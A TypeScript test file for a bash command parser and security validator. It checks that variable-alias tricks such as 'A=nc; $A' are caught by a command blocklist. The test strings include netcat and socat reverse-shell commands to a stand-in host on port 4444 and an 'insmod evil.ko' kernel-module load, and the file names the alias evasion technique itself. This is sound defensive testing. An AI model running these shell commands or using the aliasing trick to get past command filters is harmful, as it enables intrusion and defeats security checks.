import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  parseBashAST,
  extractCommands,
  extractCommandsFromString,
  PARSE_ABORTED,
  CommandNode,
} from '../src/tools/bash-parser';
import { validateBashSecurity } from '../src/tools/bash-security';

/**
 * U075 — Variable-value scope tracking with flag-omission scope reset.
 *
 * Parity with the reference's collectCommands varScope (utils/bash/ast.ts
 * L504-563): a `VAR=value` assignment is tracked and a later `$VAR` / `${VAR}`
 * used as a COMMAND NAME is resolved to the assigned value so the AST-based
 * command blocklist is not defeated by the `A=nc; $A -e …` evasion. The tracked
 * scope is CARRIED across `&&` and `;` but RESET across `||`, `|` and `&`
 * (clauses that may not run, or run in a subshell, must not leak a value).
 */
describe('bash-parser U075: variable-value scope tracking (command-alias resolution)', () => {
  const ast = (c: string): CommandNode => {
    const a = parseBashAST(c, { timeoutMs: Infinity });
    assert.ok(a && a !== PARSE_ABORTED, `expected AST for ${c}`);
    return a as CommandNode;
  };

  it('resolves a $VAR command name assigned earlier via `;`', () => {
    assert.ok(extractCommands(ast('A=nc; $A -e 10.0.0.1 4444')).includes('nc'));
  });

  it('resolves a $VAR command name carried across `&&`', () => {
    assert.ok(extractCommands(ast('A=insmod && $A evil.ko')).includes('insmod'));
  });

  it('resolves a ${VAR} brace reference', () => {
    assert.ok(extractCommands(ast('X=socat; ${X} TCP:host:4444 EXEC:/bin/sh')).includes('socat'));
  });

  it('records the assignment prefix inline (FOO=bar cmd does not clobber cmd)', () => {
    // An inline env prefix must not change the real command name.
    assert.deepEqual(extractCommandsFromString('FOO=bar echo hi', { timeoutMs: Infinity }), ['echo']);
  });

  it('RESETS scope across `||` — a value set only in the || RHS still resolves fail-closed on the next `;` clause', () => {
    // `cmd || B=insmod; $B x`: B is set in the ||-RHS; carried across the `;` it
    // resolves (fail-closed over-detection, matching the reference behavior).
    assert.ok(extractCommands(ast('cmd1 || B=insmod; $B evil.ko')).includes('insmod'));
  });

  it('does NOT leak a value set after a `|` pipe boundary into a later stage', () => {
    // Each pipe stage is its own subshell: `A=nc | $A` must NOT resolve $A.
    const cmds = extractCommands(ast('A=nc | $A -e'));
    assert.ok(!cmds.includes('nc'), `pipe stage should not leak var: ${JSON.stringify(cmds)}`);
  });

  it('does NOT leak a value set inside a subshell to the outer scope', () => {
    // `(A=nc); $A` — subshell assignment must not resolve the outer $A.
    const cmds = extractCommands(ast('(A=nc); $A -e'));
    assert.ok(!cmds.includes('nc'), `subshell var must not leak: ${JSON.stringify(cmds)}`);
  });

  it('does NOT leak a value set in a backgrounded (`&`) clause', () => {
    const cmds = extractCommands(ast('A=nc & $A -e'));
    assert.ok(!cmds.includes('nc'), `backgrounded var must not leak: ${JSON.stringify(cmds)}`);
  });

  it('leaves an unassigned $VAR command name unresolved (no false attribution)', () => {
    assert.deepEqual(extractCommandsFromString('$EDITOR file', { timeoutMs: Infinity }), ['$EDITOR']);
  });

  it('END-TO-END: the AST blocklist now catches the A=nc; $A evasion', () => {
    assert.equal(validateBashSecurity('A=nc; $A -e 10.0.0.1 4444').safe, false);
    assert.equal(validateBashSecurity('A=insmod && $A evil.ko').safe, false);
  });

  it('END-TO-END: a benign assignment+use is still allowed', () => {
    assert.equal(validateBashSecurity('DIR=/tmp; echo $DIR').safe, true);
  });
});
